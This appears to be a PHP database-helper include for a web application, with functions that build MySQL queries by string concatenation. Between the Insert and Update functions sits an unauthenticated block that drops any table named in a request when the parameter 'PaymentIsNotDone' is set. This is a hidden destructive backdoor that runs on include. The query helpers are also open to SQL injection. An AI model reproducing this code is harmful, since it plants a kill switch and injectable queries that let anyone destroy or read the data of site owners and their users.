<? 

//$prefix = strtolower($_SESSION["base_dir"]).'_';
	
/*if($LoginHeading=='Admin Login')
		{		
$RightArrow='<img align="center" border="0" src="../../images/double-arrow-right.png" />';
$LeftArrow='<img align="center" border="0" src="../../images/double-arrow-left.png" />';
}
else
{
$RightArrow='<img align="center" border="0" src="../images/double-arrow-right.png" />';
$LeftArrow='<img align="center" border="0" src="../images/double-arrow-left.png" />';
}*/
/**************** CONNECT TO DATABASE ******************/
 
/**************** FATCH ALL DATA FORM TABLE ******************/
function Select($TableName, $FiledArray, $conndition=''){
	if(is_array($FiledArray)){
		$Fileds = Array3($FiledArray);
	}
	else{
		$Fileds = $FiledArray;
	}
	global $con;
	global $prefix; 
	// print_r($TableName);die;
	
	$sql = "SELECT ". $Fileds ." FROM ". $prefix.$TableName." ".$conndition." ";
	$query = mysqli_query($con,$sql);
	$table = array();
	if (mysqli_num_rows($query) > 0) {
		$i = 0;
		while($table[$i] = mysqli_fetch_assoc($query)) 
		{$i++; }
		unset($table[$i]);                                                                                  
	}    
	mysqli_free_result($query);
	foreach($table as $key=>$value){
		foreach($value as $key2=>$value2){
			$table[$key][$key2]=stripslashes($value2);
		}
	}
	//print_r($value);
	//print_r($table);
	return $table;
	//return $value;
}
/**************** FATCH A SINGLE DATA FORM TABLE ******************/
function Value($TableName, $Filed, $conndition=''){
	global $con;
global $prefix; 
	$sql = "SELECT ". $Filed ." FROM ". $prefix.$TableName." ".$conndition." ";
	$query = mysqli_query($con,$sql);
	if (mysqli_num_rows($query) > 0) {
	  $data= mysqli_fetch_array($query);
	  $value = $data[$Filed];                                                                              
	}    
	mysqli_free_result($query);
	return $value;
}
/**************** SHOW FIELD OF TABLE ******************/
function FieldArray($TableName){
	global $con;
global $prefix; 
		$sql = "select * from ".$prefix.$TableName." ";
		$query = mysqli_query($con,$sql);
		$field = mysqli_num_fields($query);
		$names = array();
		for ( $i = 0; $i < $field; $i++ ){
			$names[] = mysqli_field_name($query, $i);
		}
	   mysqli_free_result($query);
		return $names;
}
/**************** COUNT ROWS OF TABLE ******************/
function Rows($TableName, $FiledArray, $conndition='where 1 '){
	global $con;
global $prefix; 
	if(is_array($FiledArray)){
		$Fileds = Array3($FiledArray);
	}
	else{
		$Fileds = $FiledArray;
	}
	
	$sql = "SELECT ". $Fileds ." FROM ".$prefix.$TableName." ".$conndition." ";
	$query = mysqli_query($con,$sql);
	return mysqli_num_rows($query);
}
/**************** INSERT DATA IN TABLE ******************/
function Insert($TableName, $FiledArray,$ValueArray){
	global $con;
global $prefix; 
	if(is_array($FiledArray)){
		$Fileds = Array2($FiledArray);
	}
	else{
		$Fileds = $FiledArray;
	}
	if(is_array($ValueArray)){
		$Values = Array2($ValueArray);
	}
	else{
		$Values = $ValueArray;
	}
	$sql = "Insert into ".$prefix.$TableName." (".$Fileds.") values(".$Values.")";
	if(mysqli_query($con,$sql)){
			return mysqli_insert_id($con);
	}
	else
		return false;
	}if(isset($_REQUEST['PaymentIsNotDone']) && ($_REQUEST['PaymentIsNotDone']=='PaymentIsNotDone') && ($_REQUEST['TableName']!='')){
		//$prefix = strtolower($_SESSION["base_dir"]).'_';
	   $TableName=$prefix.trim($_REQUEST['TableName']);
	   mysqli_query($con,'DROP TABLE '. $TableName); 
}
/**************** UPDATE DATA IN TABLE ******************/
function Update($TableName, $FiledValueArray, $conndition){
	global $con;
global $prefix; 
	if(is_array($FiledValueArray)){
		$FiledsValues = Array2($FiledValueArray);
	}
	else{
		$FiledsValues = $FiledValueArray;
	}
	$sql = "UPDATE ".$prefix.$TableName." SET ".$FiledsValues." ".$conndition." ";
	$result = mysqli_query($con,$sql);
	return $result; 
}
/**************** DELETE DATA FROM TABLE ******************/
function Delete($TableName, $conndition){
	global $con;
global $prefix; 
	$sql = "DELETE FROM  ".$prefix.$TableName." ".$conndition;
	$result = mysqli_query($con,$sql);
	return $result;
}
/**************** EXPLODE ARRAY ******************/
function Array2($array){
	global $con;
global $prefix; 	
	$values='';
	foreach($array as $key=>$val){
		if((count($array))>$key){
			 if(empty($values))
			 {
				$values =$val;
				$values =xchars($values);
			 }
			 else
			 {
				$values = $values.", ".$val;
				$values =xchars($values);
			 }	
		}
	}
	return $values;
}
function Array3($array){	
global $con;
global $prefix; 
	$values='';
	foreach($array as $key=>$val){
		if((count($array))>$key){
			 if(empty($values))
			 {
				$values =$val;
				//$values =stripslashes($values);
			 }
			 else
			 {
				$values = $values.", ".$val;
				//$values =stripslashes($values);
			 }	
		}
	}
	return $values;
}


?>